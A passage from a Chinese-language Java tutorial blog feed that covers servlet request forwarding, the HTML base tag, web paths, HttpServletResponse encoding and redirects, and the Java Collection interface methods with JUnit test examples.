class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Servlet1</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;在 Servlet1（柜台 1）中查看参数（材料）：&quot;</span> + username);</span><br><span class="line">        request.setAttribute(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;柜台 1 的章&quot;</span>);</span><br><span class="line">        <span class="type">RequestDispatcher</span> <span class="variable">requestDispatcher</span> <span class="operator">=</span> request.getRequestDispatcher(<span class="string">&quot;/servlet2&quot;</span>);</span><br><span class="line">        requestDispatcher.forward(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Servlet2</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;在 Servlet2（柜台 2）中查看参数（材料）：&quot;</span> + username);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">key1</span> <span class="operator">=</span> request.getAttribute(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;柜台 1 是否有章：&quot;</span> + key1);</span><br><span class="line">        System.out.println(<span class="string">&quot;Servlet2 处理自己的业务 &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问：<a href="http://localhost:8080/servlet/servlet1?username=nan">http://localhost:8080/servlet/servlet1?username=nan</a></p><p>可以看到后台输出：</p><p>在 Servlet1（柜台 1）中查看参数（材料）：nan<br>在 Servlet2（柜台 2）中查看参数（材料）：nan<br>柜台 1 是否有章：柜台 1 的章<br>Servlet2 处理自己的业务 </p><h2 id="base标签的作用"><a href="#base标签的作用" class="headerlink" title="base标签的作用"></a>base标签的作用</h2><p>当我们点击a标签进行跳转的时候，浏览器地址栏中的地址是：<a href="http://localhost:8080/servlet/a/b/c.html">http://localhost:8080/servlet/a/b/c.html</a></p><p>跳转回去的a标签路径是：..&#x2F;..&#x2F;index.html</p><p>所有相对路径在工作时候都会参照当前浏览器地址栏中的地址来进行跳转。</p><p>那么参照后得到的地址是：<a href="http://localhost:8080/servlet/index.html%EF%BC%8C%E6%98%AF%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%B7%B3%E8%BD%AC%E8%B7%AF%E5%BE%84">http://localhost:8080/servlet/index.html，是正确的跳转路径</a></p><hr><p>当我们使用<strong>请求转发</strong>来进行跳转的时候，浏览器地址栏中的地址是：<a href="http://localhost:8080/servlet/forwardC">http://localhost:8080/servlet/forwardC</a></p><p>跳转回去的a标签路径是：..&#x2F;..&#x2F;index.html</p><p>那么参照后得到的地址是：<a href="http://localhost:8080/index.html%EF%BC%8C%E6%98%AF%E9%94%99%E8%AF%AF%E7%9A%84%E8%B7%B3%E8%BD%AC%E8%B7%AF%E5%BE%84">http://localhost:8080/index.html，是错误的跳转路径</a></p><p><strong>base标签可以设置当前页面中所有相对路径工作时，参照哪个路径来进行跳转。</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh_CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--base标签设置页面相对路径工作时参照的地址，href 属性就是参考的地址值--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost:8080/07_servlet/a/b/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    这是a下的b下的c.html页面<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;../../index.html&quot;</span>&gt;</span>跳回首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web中的相对路径和绝对路径"><a href="#Web中的相对路径和绝对路径" class="headerlink" title="Web中的相对路径和绝对路径"></a>Web中的相对路径和绝对路径</h2><p>在 javaWeb 中，路径分为相对路径和绝对路径两种： </p><p>相对路径是： </p><ul><li><p>.                         表示当前目录 </p></li><li><p>..                        表示上一级目录 </p></li><li><p>资源名              表示当前目录&#x2F;资源名</p></li></ul><p>绝对路径是： <a href="http://ip:port/工程路径/资源路径">http://ip:port/工程路径/资源路径</a> </p><blockquote><p>在实际开发中，路径都使用绝对路径，而不简单的使用相对路径。 </p><p>要么绝对路径，要么base+相对路径</p></blockquote><h2 id="web-中-斜杠的不同意义"><a href="#web-中-斜杠的不同意义" class="headerlink" title="web 中 &#x2F; 斜杠的不同意义"></a>web 中 &#x2F; 斜杠的不同意义</h2><p>在 web 中 &#x2F; 斜杠 是一种<strong>绝对路径</strong>。 </p><ol><li><p>&#x2F; 斜杠 如果被浏览器解析，得到的地址是：<a href="http://ip:port/">http://ip:port/</a> </p><p><code>&lt;a href=&quot;/&quot;&gt;斜杠&lt;/a&gt;</code></p></li><li><p>&#x2F; 斜杠 如果被服务器解析，得到的地址是：<a href="http://ip:port/工程路径">http://ip:port/工程路径</a> </p><p><code>&lt;url-pattern&gt;/servlet1&lt;/url-pattern&gt; </code></p><p><code>servletContext.getRealPath(&quot;/&quot;);</code></p><p><code>request.getRequestDispatcher(&quot;/&quot;); </code></p></li></ol><p><strong>特殊情况：</strong> <code>response.sendRedirect(&quot;/&quot;); </code>把斜杠发送给浏览器解析，得到 <a href="http://ip:port/">http://ip:port/</a></p><h1 id="HttpServletResponse-类"><a href="#HttpServletResponse-类" class="headerlink" title="HttpServletResponse 类"></a>HttpServletResponse 类</h1><h2 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h2><p>HttpServletResponse 类和 HttpServletRequest 类一样。每次请求进来，Tomcat 服务器都会创建一个 Response 对象传 递给 Servlet 程序去使用。HttpServletRequest 表示请求过来的信息，HttpServletResponse 表示所有响应的信息， 我们如果需要设置返回给客户端的信息，都可以通过 HttpServletResponse 对象来进行设置。</p><h2 id="两个输出流的说明"><a href="#两个输出流的说明" class="headerlink" title="两个输出流的说明"></a>两个输出流的说明</h2><p>字节流：getOutputStream(); 常用于下载（传递二进制数据） </p><p>字符流：getWriter(); 常用于回传字符串（常用） </p><p><strong>两个流同时只能使用一个</strong></p><p>使用了字节流，就不能再使用字符流，反之亦然，否则就会报错。</p><h2 id="如何往客户端回传数据"><a href="#如何往客户端回传数据" class="headerlink" title="如何往客户端回传数据"></a><strong>如何往客户端回传数据</strong></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResponseServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        writer.write(<span class="string">&quot;阿楠博客&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="响应的乱码解决"><a href="#响应的乱码解决" class="headerlink" title="响应的乱码解决"></a>响应的乱码解决</h2><p>解决响应中文乱码方案一（<strong>不推荐使用</strong>）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置服务器字符集为 UTF-8</span></span><br><span class="line">response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="comment">// 通过响应头，设置浏览器也使用 UTF-8 字符集</span></span><br><span class="line">response.setHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">writer.write(<span class="string">&quot;阿楠博客&quot;</span>);</span><br></pre></td></tr></table></figure><p>解决响应中文乱码方案二（<strong>推荐</strong>）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 它会同时设置服务器和客户端都使用 UTF-8 字符集，还设置了响应头</span></span><br><span class="line"><span class="comment">// 此方法一定要在获取流对象之前调用才有效</span></span><br><span class="line">response.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">writer.write(<span class="string">&quot;阿楠博客&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="请求重定向"><a href="#请求重定向" class="headerlink" title="请求重定向"></a>请求重定向</h2><p>客户浏览器发送http请求—-》web服务器接受后发送302状态码响应及对应新的location给客户浏览器–》客户浏览器发现是302响应，则<strong>自动</strong>再发送一个新的http请求，请求url是新的location地址—-》服务器根据此请求寻找资源并发送给客户。</p><p><strong>例子：</strong></p><p>你先去了A局，A局的人说：“这个事情不归我们管，去B局”，然后你就从A局走了出来，自己乘车去了B局。</p><p><strong>特点：</strong></p><ol><li>浏览器地址栏会发生变化</li><li>两次请求</li><li>不共享Request域中数据</li><li>不能访问WEB-INF下的资源</li><li>可以访问工程外的资源</li></ol><p>请求重定向的第一种方案： </p><blockquote><p>&#x2F;&#x2F; 设置响应状态码 302 ，表示重定向</p><p>resp.setStatus(302); </p><p>&#x2F;&#x2F; 设置响应头，说明 新的地址在哪里 </p><p>resp.setHeader(“Location”, “<a href="http://localhost:8080/">http://localhost:8080</a>“); </p></blockquote><p>请求重定向的第二种方案（推荐使用）： </p><blockquote><p>resp.sendRedirect(“<a href="http://localhost:8080/">http://localhost:8080</a>“);</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Servlet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>集合框架</title>
      <link href="/posts/75dc/"/>
      <url>/posts/75dc/</url>
      
        <content type="html"><![CDATA[<h1 id="集合框架概述"><a href="#集合框架概述" class="headerlink" title="集合框架概述"></a>集合框架概述</h1><ul><li><p>一方面， 面向对象语言对事物的体现都是以对象的形式，为了方便对多个对象的操作，就要对对象进行存储。另一方面，使用Array存储对象方面具有一些弊端，而Java 集合就像一种容器，可以<strong>动态</strong>地把多个对象的引用放入容器中。</p><ul><li><strong>数组在内存存储方面的特点：</strong><ul><li>数组初始化以后，长度就确定了。</li><li>数组声明的类型，就决定了进行元素初始化时的类型</li></ul></li><li><strong>数组在存储数据方面的弊端：</strong><ul><li>数组初始化以后，长度就不可变了，不便于扩展</li><li>数组中提供的属性和方法少，不便于进行添加、删除、插入等操作，且效率不高。同时无法直接获取存储元素的个数</li><li>数组存储的数据是有序的、可以重复的。—-&gt;存储数据的特点单一</li></ul></li></ul></li><li><p>Java 集合类可以用于存储数量不等的多个对象，还可用于保存具有映射关系的关联数组。</p></li></ul><hr><p>Java 集合可分为 Collection 和 Map 两种体系</p><ul><li><p><strong>Collection接口：</strong>单列数据，定义了存取一组对象的方法的集合</p><ul><li>List<strong>：</strong>元素有序、可重复的集合</li><li>Set<strong>：</strong>元素无序、不可重复的集合</li></ul></li><li><p><strong>Map接口：</strong>双列数据，保存具有映射关系“key-value对”的集合</p></li></ul><hr><p>JDK提供的集合API位于java.util包内</p><p><strong>Collection接口继承树：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200914093955.png"></p><p><strong>Map接口继承树：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200914094036.png"></p><h1 id="Collection接口方法"><a href="#Collection接口方法" class="headerlink" title="Collection接口方法"></a>Collection接口方法</h1><ul><li><p>Collection 接口是 List、Set 和 Queue 接口的父接口，该接口里定义的方法既可用于操作 Set 集合，也可用于操作 List 和 Queue 集合。 </p></li><li><p>JDK不提供此接口的任何直接实现，而是提供更具体的子接口(如：Set和List)实现。 </p></li><li><p>在 Java5 之前，Java 集合会丢失容器中所有对象的数据类型，把所有对象都当成 Object 类型处理；从 JDK 5.0 增加了<strong>泛型</strong>以后，Java 集合可以记住容器中对象的数据类型。</p></li></ul><blockquote><p>1、添加</p><p>add(Object obj)</p><p>addAll(Collection coll) </p><p>2、获取有效元素的个数</p><p>int size()</p><p>3、清空集合</p><p>void clear()</p><p>4、是否是空集合 </p><p>boolean isEmpty()</p><p>5、是否包含某个元素</p><p>boolean contains(Object obj)：是通过元素的equals方法来判断是否是同一个对象。</p><p>boolean containsAll(Collection c)：也是调用元素的equals方法来比较的。拿两个集合的元素挨个比较。</p><p>6、删除</p><p>boolean remove(Object obj) ：通过元素的equals方法判断是否是要删除的那个元素。只会删除找到的第一个元素</p><p>boolean removeAll(Collection coll)：取当前集合的差集</p><p>7、取两个集合的交集</p><p>boolean retainAll(Collection c)：把交集的结果<strong>存在当前集合中</strong>，不影响c </p><p>8、集合是否相等</p><p>boolean equals(Object obj)</p><p>9、转成对象数组</p><p>Object[] toArray()</p><p>10、获取集合对象的哈希值</p><p>hashCode()</p><p>11、遍历</p><p>iterator()：返回迭代器对象，用于集合遍历</p></blockquote><p><strong>方法测试：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Collection接口中声明的方法的测试</span></span><br><span class="line"><span class="comment"> * 结论：</span></span><br><span class="line"><span class="comment"> * 向Collection接口的实现类的对象中添加数据obj时，要求obj所在类要重写equals().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CollectionTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll.add(<span class="number">123</span>);</span><br><span class="line">        coll.add(<span class="number">456</span>);</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.contains(Object obj):判断当前集合中是否包含obj</span></span><br><span class="line">        <span class="comment">//我们在判断时会调用obj对象所在类的equals()！！！</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">contains</span> <span class="operator">=</span> coll.contains(<span class="number">123</span>);</span><br><span class="line">        System.out.println(contains);<span class="comment">//true</span></span><br><span class="line">        System.out.println(coll.contains(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>)));<span class="comment">//true,String类有重写equals()</span></span><br><span class="line">        System.out.println(coll.contains(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>,<span class="number">20</span>)));<span class="comment">//重写前false --&gt;重写后true</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.containsAll(Collection coll1):判断形参coll1中的所有元素是否都存在于当前集合中。</span></span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll1</span> <span class="operator">=</span> Arrays.asList(<span class="number">123</span>,<span class="number">4567</span>);</span><br><span class="line">        System.out.println(coll.containsAll(coll1));<span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//3.remove(Object obj):从当前集合中移除obj元素。</span></span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll.add(<span class="number">123</span>);</span><br><span class="line">        coll.add(<span class="number">456</span>);</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        coll.remove(<span class="number">1234</span>);</span><br><span class="line">        System.out.println(coll);<span class="comment">//[123, 456, Person&#123;name=&#x27;Jerry&#x27;, age=20&#125;, Tom, false]</span></span><br><span class="line"></span><br><span class="line">        coll.remove(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        System.out.println(coll);<span class="comment">//[123, 456, Tom, false]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. removeAll(Collection coll1):差集：从当前集合中移除coll1中所有的元素。</span></span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll1</span> <span class="operator">=</span> Arrays.asList(<span class="number">123</span>,<span class="number">456</span>);</span><br><span class="line">        coll.removeAll(coll1);</span><br><span class="line">        System.out.println(coll);<span class="comment">//[Tom, false]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll.add(<span class="number">123</span>);</span><br><span class="line">        coll.add(<span class="number">456</span>);</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.retainAll(Collection coll1):交集：获取当前集合和coll1集合的交集，并返回给当前集合</span></span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll1</span> <span class="operator">=</span> Arrays.asList(<span class="number">123</span>,<span class="number">456</span>,<span class="number">789</span>);</span><br><span class="line">        coll.retainAll(coll1);</span><br><span class="line">        System.out.println(coll);<span class="comment">//[123, 456]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.equals(Object obj):要想返回true，需要当前集合和形参集合的元素都相同。</span></span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll2.add(<span class="number">456</span>);</span><br><span class="line">        coll2.add(<span class="number">123</span>);</span><br><span class="line">        coll2.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        coll2.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll2.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(coll.equals(coll2));<span class="comment">//false，因为元素相同但顺序不同,与ArrayList有关</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test4</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll.add(<span class="number">123</span>);</span><br><span class="line">        coll.add(<span class="number">456</span>);</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//7.hashCode():返回当前对象的哈希值</span></span><br><span class="line">        System.out.println(coll.hashCode());<span class="comment">//-1200490100</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//8.集合 ---&gt;数组：toArray()</span></span><br><span class="line">        Object[] arr = coll.toArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            System.out.println(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//拓展：数组 ---&gt;集合:调用Arrays类的静态方法asList()</span></span><br><span class="line">        List&lt;String&gt; list = Arrays.asList(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;AA&quot;</span>, <span class="string">&quot;BB&quot;</span>, <span class="string">&quot;CC&quot;</span>&#125;);</span><br><span class="line">        System.out.println(list);<span class="comment">//[AA, BB, CC]</span></span><br><span class="line"></span><br><span class="line">        <span class="type">List</span> <span class="variable">arr1</span> <span class="operator">=</span> Arrays.asList(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">123</span>, <span class="number">456</span>&#125;);</span><br><span class="line">        System.out.println(arr1.size());<span class="comment">//1  [[I@32a1bec0]</span></span><br><span class="line"></span><br><span class="line">        <span class="type">List</span> <span class="variable">arr2</span> <span class="operator">=</span> Arrays.asList(<span class="keyword">new</span> <span class="title class_">Integer</span>[]&#123;<span class="number">123</span>, <span class="number">456</span>&#125;);</span><br><span class="line">        System.out.println(arr2.size());<span class="comment">//2  [123, 456]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Iterator迭代器接口"><a href="#Iterator迭代器接口" class="headerlink" title="Iterator迭代器接口"></a>Iterator迭代器接口</h1><h2 id="使用-Iterator-接口遍历集合元素"><a href="#使用-Iterator-接口遍历集合元素" class="headerlink" title="使用 Iterator 接口遍历集合元素"></a>使用 Iterator 